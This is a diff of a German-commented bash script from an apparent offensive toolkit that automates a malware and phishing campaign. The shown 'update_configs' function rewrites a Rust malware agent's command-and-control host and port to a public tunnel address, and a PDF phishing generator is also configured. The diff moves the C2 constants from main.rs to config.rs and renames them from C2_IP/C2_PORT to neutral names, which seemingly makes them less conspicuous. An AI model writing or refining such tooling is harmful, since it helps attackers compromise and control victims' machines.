@@ -17,7 +17,7 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 ROOT_DIR="$(dirname "$SCRIPT_DIR")"
 
 # Dateien & Pfade
-MAIN_RS="$ROOT_DIR/malware_agent/src/main.rs"
+CONFIG_RS="$ROOT_DIR/malware_agent/src/config.rs"
 PDF_SCRIPT="$ROOT_DIR/delivery/pdf_phishing/generate_phishing_pdf.py"
 
 # Temp Files für Logs
@@ -172,13 +172,13 @@ start_pinggy_delivery() {
 update_configs() {
   print_status "Aktualisiere Konfigurationen..."
 
-  # 1. Rust Agent Config
-  if [ -f "$MAIN_RS" ]; then
-    sed -i "s|const C2_IP: &str = \"[^\"]*\";|const C2_IP: \&str = \"$PINGGY_HOST\";|" "$MAIN_RS"
-    sed -i "s|const C2_PORT: u16 = [0-9]*;|const C2_PORT: u16 = $PINGGY_PORT;|" "$MAIN_RS"
-    print_success "Rust C2 Config updated."
+  # 1. Rust Agent Config (config.rs statt main.rs)
+  if [ -f "$CONFIG_RS" ]; then
+    sed -i "s|const CONFIG_IP_ADDR: &str = \"[^\"]*\";|const CONFIG_IP_ADDR: \&str = \"$PINGGY_HOST\";|" "$CONFIG_RS"
+    sed -i "s|const CONFIG_PORT: u16 = [0-9]*;|const CONFIG_PORT: u16 = $PINGGY_PORT;|" "$CONFIG_RS"
+    print_success "Rust C2 Config updated in config.rs"
   else
-    print_error "main.rs nicht gefunden!"
+    print_error "config.rs nicht gefunden!"
   fi
 
   # 2. PDF Generator Config
